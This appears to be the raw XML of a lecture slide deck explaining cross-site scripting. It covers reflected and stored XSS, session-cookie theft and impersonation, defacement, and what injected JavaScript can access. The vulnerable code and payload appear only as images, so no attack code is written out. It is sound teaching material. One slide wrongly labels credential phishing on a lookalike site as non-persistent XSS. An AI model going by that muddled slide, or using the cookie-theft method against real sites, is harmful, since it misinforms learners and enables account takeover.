              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21355560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Cross Site Scripting </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A web page or web application is vulnerable to XSS if it uses un-sanitized user input in the output that it generates. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This user input must then be parsed by the victim’s browser. XSS attacks are possible in VBScript, ActiveX, Flash, and even CSS. However, they are most common in JavaScript, primarily because JavaScript is fundamental to most browsing experiences.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2707286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76B134-3697-922B-585E-96DDF4ED6F20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>Understanding XSS Vulnerability Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7175CA3-0EE3-FE8D-AF67-E1536A621A27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="483810" y="2288419"/>
            <a:ext cx="11059885" cy="4489752"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>Cross Site Scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> can happen in many ways. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>For example, an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> may present you with a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>malicious website</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> looking like its original and ask you to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>fill in your credentials</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>When your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>browser sends its cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> over to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>malicious website</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>, the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>attacker decodes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> your information and uses it to impersonate you at the original site. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>This is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>targeted attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> and is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>non-persistent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="020F0502020204030204" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t> in technical terms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>Websites and web applications usually send a cookie to identify a user after he/she has logged in. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>For every action from the user on the site, the user's browser has to resend the cookie to the web application as identification. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>If an attacker is able to inject a Cross-site Scripting (XSS) payload on the web application, the malicious script could steal the user's cookie and send it to the attacker. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>The attacker can then use the cookie to impersonate the user in the web application. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>The most dangerous variation of XSS is persistent, or stored XSS. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
                <a:cs typeface="Varela Round" panose="00000500000000000000" pitchFamily="2" charset="-79"/>
              </a:rPr>
              <a:t>This is because the attacker’s XSS payload gets stored and served to each visitor accessing the website or web application without any user interaction.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{88F8BC1F-ACC2-F7F9-6ECB-1CEDE9A7FF36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>5</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11784911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a:t>“Isn’t Cross-site Scripting the User’s Problem?”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If an attacker can abuse an XSS vulnerability on a web page to execute arbitrary JavaScript in a user’s browser, the security of that vulnerable website or vulnerable web application and its users has been compromised. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS is not the user’s problem like any other security vulnerability. If it is affecting your users, it affects you. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-site Scripting may also be used to deface a website instead of targeting the user. The attacker can use injected scripts to change the content of the website or even redirect the browser to another web page, for example, one that contains malicious code.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19496604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9200" y="1063416"/>
            <a:ext cx="8761413" cy="706964"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>What can the attacker do with JavaScript </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malicious JavaScript has access to all the objects that the rest of the web page has access to. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This includes access to the user’s cookies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript can read the browser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="111C24"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Roboto" panose="02000000000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>document object model (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM) and make arbitrary modifications to it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript can use the XMLHttpRequest object to send HTTP requests with arbitrary content to arbitrary destinations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>it can gain access to the user’s geo location, webcam, microphone, and even specific files from the user’s file system using HTML5 APIs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30901279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Cross-site Scripting Works</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>There are two stages to a typical XSS attack:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>To run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject malicious code (payload) into a web page that the victim visits.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>After that, the victim must visit the web page with the malicious code. If the attack is directed at particular victims, the attacker can use social engineering and/or phishing to send a malicious URL to the victim. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An attacker can then insert a malicious string that will be used within the web page and treated as source code by the victim’s browser. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>There are also variants of XSS attacks where the attacker lures the user to visit a URL using social engineering and the payload is part of the link that the user clicks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4923516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p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The following is a snippet of server-side pseudo-code that is used to display the most recent comment on a web page: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It is vulnerable to XSS, because an attacker could submit a comment that contains a malicious payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>9</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1476636" y="3297261"/>
            <a:ext cx="8875904" cy="1014389"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1476636" y="5254388"/>
            <a:ext cx="8875904" cy="765412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7282805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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
